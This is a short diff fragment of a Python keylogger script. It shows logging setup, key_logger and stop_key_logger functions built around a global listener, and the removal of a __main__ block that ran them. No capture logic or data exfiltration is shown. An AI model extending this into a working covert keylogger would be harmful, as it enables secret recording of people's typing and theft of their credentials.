@@ -18,8 +18,6 @@ logging.basicConfig(filename=logfile_path,
                     level=logging.DEBUG,
                     format='%(asctime)s [%(levelname)s] %(message)s'
                     )
-
-
 def key_logger():
     def key_logger():
         global listener
@@ -50,8 +48,3 @@ def stop_key_logger():
 
     listener.stop()
 
-
-if __name__ == "__main__":
-    # TODO: test in widows
-    key_logger()
-    stop_key_logger()
